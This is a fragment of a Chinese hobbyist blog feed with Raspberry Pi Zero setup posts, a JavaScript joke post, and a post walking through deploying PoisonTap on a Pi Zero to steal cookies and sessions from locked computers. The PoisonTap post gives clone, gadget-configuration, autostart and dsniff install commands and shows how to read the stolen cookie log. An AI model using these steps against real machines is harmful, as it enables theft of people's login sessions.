<p>在树莓派下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">tar xzf  8188eu-4.4.34-930.tar.gz</div><div class="line">sudo ./install.sh</div><div class="line">reboot</div></pre></td></tr></table></figure></p>
<p>然后检查一下 <code>lsusb</code>(这个其实不靠谱) </p>
<p>然后再检查一下 <code>ifconfig</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">wlan0     Link encap:Ethernet  HWaddr 0c:82:68:12:93:8f</div><div class="line">          inet6 addr: fe80::4336:2657:c812:f11b/64 Scope:Link</div><div class="line">          UP BROADCAST MULTICAST  MTU:1500  Metric:1</div><div class="line">          RX packets:0 errors:0 dropped:6 overruns:0 frame:0</div><div class="line">          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0</div><div class="line">          collisions:0 txqueuelen:1000</div><div class="line">          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)</div></pre></td></tr></table></figure>
<p>果然正确安装了。</p>
<h2 id="配置WiFi"><a href="#配置WiFi" class="headerlink" title="配置WiFi"></a>配置WiFi</h2><p>但是<code>wlan0     Link encap:Ethernet</code>被识别为了以太网，接下来我们继续解决坑。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo iwlist wlan0 scan</div></pre></td></tr></table></figure></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">Cell 03 - Address: F0:B0:52:3B:7B:68</div><div class="line">                  ESSID:<span class="string">"ASK4 Wireless"</span></div><div class="line">                  Protocol:IEEE 802.11gn</div><div class="line">                  Mode:Master</div><div class="line">                  Frequency:2.417 GHz (Channel 2)</div><div class="line">                  Encryption key:off</div><div class="line">                  Bit Rates:144 Mb/s</div><div class="line">                  Quality=18/100  Signal level=70/100</div><div class="line">                  Extra:fm=0001</div></pre></td></tr></table></figure>
<p>随后对<code>wpa_supplicant.conf</code>文件进行编辑，使之加入到自己的网络里。</p>
<p>请注意，<code>key_mgmt=NONE</code>表示没有WiFi密码(这是个查了很久猜得到的宝贵线索)，如果有密码请把这个更改为<code>psk = &quot;密码&quot;</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo vi /etc/wpa_supplicant/wpa_supplicant.conf</div></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">country=GB</div><div class="line">ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev</div><div class="line">update_config=1</div><div class="line">network=&#123;</div><div class="line">        ssid=<span class="string">"ASK4 Wireless"</span></div><div class="line">        key_mgmt=NONE</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>编辑<code>/etc/network/interfaces</code>文件，使wlan0为动态分配获取IP。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo vi /etc/network/interfaces</div></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">auto lo</div><div class="line">iface lo inet loopback</div><div class="line"></div><div class="line">iface eth0 inet dhcp</div><div class="line"></div><div class="line">auto wlan0</div><div class="line">allow-hotplug wlan0</div><div class="line">iface wlan0 inet dhcp</div><div class="line">wpa-conf /etc/wpa_supplicant/wpa_supplicant.conf</div><div class="line"></div><div class="line"></div><div class="line">allow-hotplug wlan1</div><div class="line">iface wlan1 inet manual</div><div class="line">    wpa-conf /etc/wpa_supplicant/wpa_supplicant.conf</div></pre></td></tr></table></figure>
<p>随后重启我们wlan0</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo ifdown wlan0</div><div class="line">sudo ifup wlan0</div></pre></td></tr></table></figure>
<p>如果能搜索到WiFi会自动进行DHCP获取ip地址阶段</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">Listening on LPF/wlan0/0c:82:68:12:93:8f</div><div class="line">Sending on   LPF/wlan0/0c:82:68:12:93:8f</div><div class="line">Sending on   Socket/fallback</div><div class="line">DHCPDISCOVER on wlan0 to 255.255.255.255 port 67 interval 8</div><div class="line">DHCPDISCOVER on wlan0 to 255.255.255.255 port 67 interval 12</div><div class="line">DHCPREQUEST on wlan0 to 255.255.255.255 port 67</div><div class="line">DHCPOFFER from 10.80.192.1</div><div class="line">DHCPACK from 10.80.192.1</div><div class="line">bound to 10.80.200.83 -- renewal <span class="keyword">in</span> 440 seconds.</div></pre></td></tr></table></figure>
<p>随后，用<code>ifconfig</code>命令查看一下获取的IP地址</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">wlan0     Link encap:Ethernet  HWaddr 0c:82:68:12:93:8f</div><div class="line">          inet addr:10.80.200.83  Bcast:10.80.207.255  Mask:255.255.240.0</div><div class="line">          UP BROADCAST MULTICAST  MTU:1500  Metric:1</div><div class="line">          RX packets:0 errors:0 dropped:17 overruns:0 frame:0</div><div class="line">          TX packets:0 errors:0 dropped:1 overruns:0 carrier:0</div><div class="line">          collisions:0 txqueuelen:1000</div><div class="line">          RX bytes:4681 (4.5 KiB)  TX bytes:18372 (17.9 KiB)</div></pre></td></tr></table></figure>
<p><img src="/content/images/zeronet/3.png" alt=""></p>
<p>再对mac地址进行绑定，再进入vnc，试试看</p>
<p><img src="/content/images/zeronet/4.jpg" alt=""></p>
<p>哇 可以上网了！</p>
<p>然而悲痛的消息还有呢~</p>
<p>内网隔离</p>
<h2 id="ngrok-TCP转发"><a href="#ngrok-TCP转发" class="headerlink" title="ngrok TCP转发"></a>ngrok TCP转发</h2><p>这难不倒我，用ngrok就可以解决，正好身在墙外，更加方便。</p>
<p>下载ngrok<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip</div><div class="line">unzip ngrok-stable-linux-arm.zip</div></pre></td></tr></table></figure></p>
<p>配置开机启动项<code>vi /etc/rc.local</code><br>在exit 0 前面加入<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">/home/pi/ngrok authtoken 你的AUTO</div><div class="line">/home/pi/ngrok tcp 22</div></pre></td></tr></table></figure></p>
<p>搞定！拔掉USB HUB，关掉路由器，重启！</p>
<p>过了10分钟后，我们的树莓派上线了！</p>
<p><img src="/content/images/zeronet/5.png" alt=""></p>
<p>用ssh命令连接一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh pi@0.tcp.ngrok.io -p 13016</div></pre></td></tr></table></figure>
<p>连接速度超级快，如同本地一样，给ngrok官网点赞。</p>
<p><img src="/content/images/zeronet/6.jpg" alt=""></p>
<h2 id="lighttpd-部署"><a href="#lighttpd-部署" class="headerlink" title="lighttpd 部署"></a>lighttpd 部署</h2><p>总要搞点事情嘛，部署一个Web服务对于512MB的内存的树莓派Zero不过分吧。</p>
<p>那么什么Web服务最合适呢？脑海第一时间想到轻量级的lighttpd，ngnix我都嫌弃费资源，那么就它了。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install -y lighttpd</div></pre></td></tr></table></figure>
<p>安装完成！目录在<code>/var/www/html</code></p>
<p>写好html，部署上去。</p>
<p>那么如何才能办到同时映射到两个端口呢？ngrok的官方文档有提示。</p>
<p><code>nano /home/pi/.ngrok2/ngrok.yml</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">authtoken: 你的AUTH</div><div class="line">region: eu</div><div class="line">json_resolver_url: &quot;&quot;</div><div class="line">dns_resolver_ips: []</div><div class="line"></div><div class="line">tunnels:</div><div class="line">  app-foo:</div><div class="line">    addr: 80</div><div class="line">    proto: http</div><div class="line">    host_header: app-foo.dev</div><div class="line">  app-bar:</div><div class="line">    addr: 22</div><div class="line">    proto: tcp</div><div class="line">    host_header: app-bar.dev</div></pre></td></tr></table></figure></p>
<p>这样就部署了两个服务，<code>app-foo</code>，<code>app-bar</code>，不错，开机再启动他们。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo nano /etc/rc.local</div></pre></td></tr></table></figure>
<p>把之前那句换成<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/home/pi/proj/ngrok/ngrok start --config /home/pi/.ngrok2/ngrok.yml app-foo app-bar</div></pre></td></tr></table></figure></p>
<p>好了，剩下我们要做的就是重启与等待。</p>
<p><img src="/content/images/zeronet/7.jpg" alt=""></p>
<p>哈哈，上线了，访问一下。</p>
<p><img src="/content/images/zeronet/8.png" alt=""></p>
<p>这个只有4英镑的树莓派实现联网后花费了：</p>
<p>树莓派：4磅</p>
<p>OTG线：0.86磅</p>
<p>WIFI适配器：人民币25元</p>
<p>储存卡：9磅</p>
<p>谢谢<del>观看</del>忍耐全文。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;说句实话，Zero真的不适合把玩，想让他连上网，太难了。&lt;/p&gt;
&lt;h1 id=&quot;痛点&quot;&gt;&lt;a href=&quot;#痛点&quot; class=&quot;headerlink&quot; title=&quot;痛点&quot;&gt;&lt;/a&gt;痛点&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;住公寓，有WiFi/Lan登录认证系统&lt;/li&gt;
&lt;li
    
    </summary>
    
      <category term="Rasberry" scheme="http://blog.yfgeek.com/categories/Rasberry/"/>
    
    
      <category term="Raspberry" scheme="http://blog.yfgeek.com/tags/Raspberry/"/>
    
  </entry>
  
  <entry>
    <title>Wat 吐槽JavaScript</title>
    <link href="http://blog.yfgeek.com/2016/12/21/wat/"/>
    <id>http://blog.yfgeek.com/2016/12/21/wat/</id>
    <published>2016-12-21T01:17:26.000Z</published>
    <updated>2017-03-08T19:05:11.000Z</updated>
    
    <content type="html"><![CDATA[<p>今天晚上在研究React技术栈头疼的时候，突然看到一个吐槽JavaScript的视频，简直搞笑，不过也挺客观的，毕竟是一个10天内攒出来的语言，虽然现在发展有ES支撑，但是依然非常零散，不过我按照视频里的做法试了一下，似乎有的返回结果不太一样。</p>
<h1 id="Wat"><a href="#Wat" class="headerlink" title="Wat"></a>Wat</h1><p><a href="https://www.destroyallsoftware.com/talks/wat" target="_blank" rel="external"><img src="https://www.destroyallsoftware.com/images/posters/talks/wat.poster.png" alt=""></a></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">[] + []</div><div class="line"><span class="string">""</span></div><div class="line">[] + &#123;&#125;</div><div class="line"><span class="string">"[object Object]"</span></div><div class="line">&#123;&#125; + []</div><div class="line"><span class="number">0</span></div><div class="line">&#123;&#125; + &#123;&#125;</div><div class="line"><span class="string">"[object Object][object Object]"</span></div><div class="line"><span class="built_in">Array</span>(<span class="number">16</span>)</div><div class="line">[<span class="literal">undefined</span> × <span class="number">16</span>]</div><div class="line"><span class="built_in">Array</span>(<span class="number">16</span>).join(<span class="string">"wat"</span>)</div><div class="line"><span class="string">"watwatwatwatwatwatwatwatwatwatwatwatwatwatwat"</span></div><div class="line"><span class="built_in">Array</span>(<span class="number">16</span>).join(<span class="string">"wat"</span> - <span class="number">1</span> ) + <span class="string">" Batman!"</span></div><div class="line"><span class="string">"NaNNaNNaNNaNNaNNaNNaNNaNNaNNaNNaNNaNNaNNaNNaN Batman!"</span></div></pre></td></tr></table></figure>
<p>总之，看完这个视频，我就想说一句：</p>
<p><img src="/content/images/wat/1.jpg" alt=""></p>
<h1 id="Javascript的出生与死亡"><a href="#Javascript的出生与死亡" class="headerlink" title="Javascript的出生与死亡"></a>Javascript的出生与死亡</h1><p>此外还有另一个视频 对JS从1995-2035年的历史阐述及大胆预测。</p>
<p><a href="https://www.destroyallsoftware.com/talks/the-birth-and-death-of-javascript" target="_blank" rel="external"><img src="https://www.destroyallsoftware.com/images/posters/talks/the-birth-and-death-of-javascript.poster.png" alt=""></a></p>
<p>十分客观的罗列出了JS的缺点、当前JS发展趋势必然产生的低效率问题。</p>
<p><img src="/content/images/wat/2.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天晚上在研究React技术栈头疼的时候，突然看到一个吐槽JavaScript的视频，简直搞笑，不过也挺客观的，毕竟是一个10天内攒出来的语言，虽然现在发展有ES支撑，但是依然非常零散，不过我按照视频里的做法试了一下，似乎有的返回结果不太一样。&lt;/p&gt;
&lt;h1 id=&quot;Wa
    
    </summary>
    
      <category term="笑话" scheme="http://blog.yfgeek.com/categories/%E7%AC%91%E8%AF%9D/"/>
    
    
      <category term="Web" scheme="http://blog.yfgeek.com/tags/Web/"/>
    
      <category term="笑话" scheme="http://blog.yfgeek.com/tags/%E7%AC%91%E8%AF%9D/"/>
    
  </entry>
  
  <entry>
    <title>30秒内盗取任意PC的Cookie神器 PoisonTap</title>
    <link href="http://blog.yfgeek.com/2016/12/18/poisontap/"/>
    <id>http://blog.yfgeek.com/2016/12/18/poisontap/</id>
    <published>2016-12-18T18:44:51.000Z</published>
    <updated>2017-03-08T19:05:11.000Z</updated>
    
    <content type="html"><![CDATA[<p>著名黑阔Samy Kamkar利用Raspberry Pi Zero黑客神器PoisonTap，只需30秒，就可以窃取有任意密码的电脑系统下的Cookie和Session，并实现长期后门安装。PoisonTap不是暴力破解密码，而是绕过密码。</p>
<p>是的，买了Raspberry Pi Zero，有幸尝试了一下这个基于Node的工具，真乃神器。</p>
<a id="more"></a>
<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>PoisonTap 通吃 Windows/Mac/Linux系统。其实现原理十分猥琐。</p>
<p><img src="/content/images/poisontap/1.gif" alt=""></p>
<p>把自己伪装成有线网卡，一旦插入系统中，众所周知，所有的操作系统的规则都是这样的：</p>
<blockquote>
<p>有线网络&gt;无线网络</p>
</blockquote>
<p>也就是说，如果他连接着Wi-Fi，没关系，系统会以我的伪网卡为最高优先级。在系统处于锁屏状态下，只要有网络通信，无论系统通信哪个都会被强制跳转到我用于 攻击你的页面 ，成批量的窃取你的Cookie和Session。</p>
<p>没错，就是你猜到的MITM，中间人攻击。通过PoisonTap，我们可以：</p>
<ul>
<li>模拟成一个伪USB网卡</li>
<li>不需要解锁电脑就可以实现攻击</li>
<li>劫持系统所有网络连接的所有流量 包括局域网</li>
<li>窃取储存Alexa前一百万的网站的Cookie和Session</li>
<li>用远程outbound的方式进行WebSocket或DNS重绑定攻击</li>
<li>用HTTP的JS缓存禁止对该PC进行web后门安装，缓存涉及到上千个域名和cdn js缓存供应商</li>
<li>截取Cookie后可以使用该PC的Cookie进行登录，实现中间人攻击的最终目标</li>
</ul>
<p><img src="/content/images/poisontap/2.gif" alt=""></p>
<p>PoisonTap比你想象的更强大的是，PoisonTap能够突破以下普通MITM办不到的几点：</p>
<ul>
<li>锁屏密码</li>
<li>路由表ARP的优先级设置和网络适配器优先级设置</li>
<li>同源策略 (Same-Origin Policy)</li>
<li>X-Frame-Options 响应头攻击</li>
<li>Cookie的HttpOnly安全设置</li>
<li>Cookie的SameSite安全属性</li>
<li>两步/多步验证密码(2FA/MFA)</li>
<li>DNS劫持</li>
<li>跨域资源共享CORS</li>
<li>HTTPS cookie 保护</li>
</ul>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>接着昨天的零网络配置，我们不需要任何网口 WiFi 蓝牙 就可以完成配置。</p>
<p>注意！配置前请保证<code>apt-get</code>命令是可以用的且可以联网的，配置过程中不允许出错，否则会出大问题。</p>
<p>首先，我们在本机下载下来这个神器Poisontap</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git <span class="built_in">clone</span> https://github.com/samyk/poisontap</div></pre></td></tr></table></figure>
<p>然后，我们用scp命令把Poisontap传到Raspberry Pi Zero上。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">scp -r poisontap pi@zero.local:~</div></pre></td></tr></table></figure></p>
<p>登录到树莓派上，运行<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> poisontap</div><div class="line"><span class="built_in">echo</span> <span class="_">-e</span> <span class="string">"\nauto usb0\nallow-hotplug usb0\niface usb0 inet static\n\taddress 1.0.0.1\n\tnetmask 0.0.0.0"</span> &gt;&gt; /etc/network/interfaces</div><div class="line"><span class="built_in">echo</span> <span class="string">"dtoverlay=dwc2"</span> &gt;&gt; /boot/config.txt</div><div class="line"><span class="built_in">echo</span> <span class="_">-e</span> <span class="string">"dwc2\ng_ether"</span> &gt;&gt; /etc/modules</div><div class="line">sudo sed --in-place <span class="string">"/exit 0/d"</span> /etc/rc.local</div><div class="line"><span class="built_in">echo</span> <span class="string">"/bin/sh /home/pi/poisontap/pi_startup.sh"</span> &gt;&gt; /etc/rc.local</div><div class="line">mkdir /home/pi/poisontap</div><div class="line">chown -R pi /home/pi/poisontap</div><div class="line">apt-get update &amp;&amp; apt-get upgrade</div><div class="line">apt-get -y install isc-dhcp-server dsniff screen nodejs</div></pre></td></tr></table></figure></p>
<p>确保以上都成功后，运行<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo cp dhcpd.conf /etc/dhcp/dhcpd.conf</div><div class="line">reboot</div></pre></td></tr></table></figure></p>
<p>好了，已经安装好了，接下来我们可以Hack啦~</p>
<h1 id="Hack"><a href="#Hack" class="headerlink" title="Hack"></a>Hack</h1><h2 id="Cookie-和-Session窃取"><a href="#Cookie-和-Session窃取" class="headerlink" title="Cookie 和 Session窃取"></a>Cookie 和 Session窃取</h2><p>把配置好的树莓派重新插入电脑里，这时他已经变成了黑阔神器了。</p>
<p>为了使攻击过程可视化，我们访问 www.google.com</p>
<p><img src="/content/images/poisontap/4.png" alt=""></p>
<p>动画非常炫酷，这时候已经在窃取成千上万的网站的Cookie了，吃个小饼干。</p>
<p><img src="/content/images/poisontap/5.png" alt=""></p>
<p>打开Chrome的工具看一看，哇。</p>
<p>随后，Cookie都被保存在树莓派里了，我们连接上树莓派的SSH，看一下，成功。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat poisontap.cookies.log</div></pre></td></tr></table></figure>
<p><img src="/content/images/poisontap/3.png" alt=""></p>
<h2 id="伪造网站"><a href="#伪造网站" class="headerlink" title="伪造网站"></a>伪造网站</h2><h2 id="远程后门"><a href="#远程后门" class="headerlink" title="远程后门"></a>远程后门</h2><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://github.com/samyk/poisontap" target="_blank" rel="external">https://github.com/samyk/poisontap</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;著名黑阔Samy Kamkar利用Raspberry Pi Zero黑客神器PoisonTap，只需30秒，就可以窃取有任意密码的电脑系统下的Cookie和Session，并实现长期后门安装。PoisonTap不是暴力破解密码，而是绕过密码。&lt;/p&gt;
&lt;p&gt;是的，买了Raspberry Pi Zero，有幸尝试了一下这个基于Node的工具，真乃神器。&lt;/p&gt;
    
    </summary>
    
      <category term="Hack" scheme="http://blog.yfgeek.com/categories/Hack/"/>
    
    
      <category term="Hack" scheme="http://blog.yfgeek.com/tags/Hack/"/>
    
  </entry>
  
  <entry>
    <title>Raspberry Pi Zero 无需键盘网络 配置教程</title>
    <link href="http://blog.yfgeek.com/2016/12/17/raspizero/"/>
    <id>http://blog.yfgeek.com/2016/12/17/raspizero/</id>
    <published>2016-12-17T21:58:26.000Z</published>
    <updated>2017-03-08T19:05:11.000Z</updated>
    
    <content type="html"><![CDATA[<p>我大概是个Raspberry Pi粉丝，到了英国后总感觉不买点树莓派的东西亏，可是之前已经在中国买了树莓派3了，于是决定买点特别的，做点有意思的事情。</p>
<p>上个月，鉴于我在英国的巨大地理优势的缘故，买了一个4磅的Raspberry Pi Zero，不过网络上关于树莓派Zero的文章真的甚少，因为实在太难原价买到了。</p>
<a id="more"></a> 
<p>请注意，不要认为所谓的4磅很便宜，毕竟，我还多掏了2.50磅的邮费。树莓派Zero在中国并不便宜，因为树莓派Zero的产能有限，每周只能供很少的货，买树莓派Zero就像抢12306一样，我抢了两周，也正是因为这个原因，树莓派Zero在亚马逊的黄牛卖家卖20磅，淘宝卖120元左右，实际上原价只有40元左右。</p>
<h1 id="信仰充值"><a href="#信仰充值" class="headerlink" title="信仰充值"></a>信仰充值</h1><p>滴！信仰充值成功！</p>
<p><img src="/content/images/raspizero/mail.jpg" alt=""></p>
<p>没有错，你没有看错，就是这么小，但是小也有小的坏处，没有USB口，没有Wi-Fi，没有网线接口，似乎什么都没有用。</p>
<ul>
<li>1Ghz, Single-core CPU</li>
<li>512MB RAM</li>
<li>Mini HDMI and USB On-The-Go ports</li>
<li>Micro USB power</li>
<li>HAT-compatible 40-pin header</li>
<li>Composite video and reset headers</li>
</ul>
<p>不过值得一提的是，USB On-The-Go接口也可以用来供电。</p>
<h1 id="发车"><a href="#发车" class="headerlink" title="发车"></a>发车</h1><p>网络上关于树莓派Zero如何连接配置大概有以下几种：</p>
<ul>
<li>OTG口转USB 接 USB以太网适配器</li>
<li>OTG口转USB 接 USB Wi-Fi</li>
<li>OTG口转USB 接 USB键盘 且 用HDMI接显示器</li>
<li>GPIO接以太网适配器</li>
</ul>
<p>但是以上，都太麻烦了，对不对？</p>
<p>那么关键问题就来了，如何才能在 没有网口、没有Wi-Fi、没有显示器、没有鼠标、没有键盘的情况下 配置可爱的树莓派Zero呢？</p>
<p>我们 可以 把 树莓派 虚拟为 网卡，然后在内网连接它。</p>
<p>1.下载完整版 Raspbian Jessie 或 Raspbian Jessie Lite 系统，并且刷到你的SD Card里，Windows用Win32 Disk Imager， Mac/Linux 用命令，如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">diskutil list</div><div class="line">diskutil unmountDisk /dev/SD卡的标号 <span class="comment">#如disk2</span></div><div class="line"><span class="built_in">cd</span> /Users/ivan/Downloads/2016-11-25-raspbian-jessie <span class="comment">#进入目录</span></div><div class="line">sudo dd bs=1m <span class="keyword">if</span>=2016-11-25-raspbian-jessie.img of=/dev/rdisk2</div></pre></td></tr></table></figure>
<p>2.刷好系统后编辑<code>config.txt</code>文件，在最后一行下，另起一行添加：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">dtoverlay=dwc2</div></pre></td></tr></table></figure></p>
<p>保存文件</p>
<p>3.最后，打开<code>cmdline.txt</code>文件。<br>找到单词<code>rootwait</code>，在其之后添加：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">modules-load=dwc2,g_ether</div></pre></td></tr></table></figure>
<p>4.添加一个文件名为<code>ssh</code>到根目录下，内容为空</p>
<p>5.把SD Card放到树莓派Zero，用安卓数据线与电脑连接，USB口接OTG口，等待60-90s，电脑会发现网卡并且自动配置ip地址。</p>
<p><img src="/content/images/raspizero/1.png" alt=""></p>
<p>6.Ping 一下raspberrypi.local看是否能通</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">PING raspberrypi.local (169.254.70.245): 56 data bytes</div><div class="line">64 bytes from 169.254.70.245: icmp_seq=0 ttl=64 time=0.570 ms</div><div class="line">64 bytes from 169.254.70.245: icmp_seq=1 ttl=64 time=0.338 ms</div><div class="line">64 bytes from 169.254.70.245: icmp_seq=2 ttl=64 time=0.316 ms</div><div class="line">64 bytes from 169.254.70.245: icmp_seq=3 ttl=64 time=0.344 ms</div></pre></td></tr></table></figure>
<p>7.ssh连接raspberrypi.local，默认密码为raspberry<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pi@raspberrypi.local</div></pre></td></tr></table></figure></p>
<h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p>因为没有网络，只能通过下载离线安装文件，传输到树莓派内，再在树莓派里安装。</p>
<h2 id="配置树莓派"><a href="#配置树莓派" class="headerlink" title="配置树莓派"></a>配置树莓派</h2><p>通过直接运行<code>raspi-config</code>命令</p>
<p>你需要做</p>
<ul>
<li>容量扩展</li>
<li>更改系统时区</li>
<li>更改系统密码</li>
</ul>
<p>同时你需要通过执行<code>sudo passwd root</code>更改root密码</p>
<h2 id="安装vnc-server"><a href="#安装vnc-server" class="headerlink" title="安装vnc-server"></a>安装vnc-server</h2><p>首先，去<a href="https://www.realvnc.com/download/vnc/raspberrypi/" target="_blank" rel="external">VNC官网</a>下载最新版本的vnc-server</p>
<p>用scp命令传到树莓派上</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">scp /Users/ivan/Downloads/VNC-5.3.2-Linux-ARM-DEB.tar.gz  pi@raspberrypi.local:~</div></pre></td></tr></table></figure>
<p>在树莓派shell下，安装VNC<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">tar xvf VNC-5.3.2-Linux-ARM-DEB.tar.gz</div><div class="line">sudo dpkg -i VNC-Server-5.3.2-Linux-ARM.deb</div></pre></td></tr></table></figure></p>
<p><img src="/content/images/raspizero/2.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">vncpasswd -user  # 设置连接密码</div><div class="line">vncserver  # 启动vncserver</div></pre></td></tr></table></figure>
<p>连接raspberry.local:1测试成功</p>
<p><img src="/content/images/raspizero/3.png" alt=""></p>
<h2 id="设置代理"><a href="#设置代理" class="headerlink" title="设置代理"></a>设置代理</h2><p>本来想着，既然把它虚拟为网卡了，能否NAT网络给他让他上网？事实上，是失败的。</p>
<p>那么我们有一个临时解决方案，就是设置代理</p>
<p>首先，在本机搭建一个squid</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">brew update</div><div class="line">brew install squid</div></pre></td></tr></table></figure>
<p>然后下载<a href="http://squidman.net/squidman/" target="_blank" rel="external">SquidMan</a>，安装。<br>在本机开启端口为8080的HTTP代理服务，并把本机名称更为Mac。</p>
<p>进入树莓派shell，输入：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> /etc/apt/apt.conf.d</div><div class="line">sudo vi /etc/apt/apt.conf.d</div></pre></td></tr></table></figure></p>
<p>最后一行加入一句话：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Acquire::http::Proxy &quot;http://Mac.local:8080&quot;;</div></pre></td></tr></table></figure></p>
<p>保存</p>
<p>apt-get update一下，怎么样是不是能装软件了？</p>
<h1 id="感想"><a href="#感想" class="headerlink" title="感想"></a>感想</h1><p>这块小板子，我太喜欢了，好精致</p>
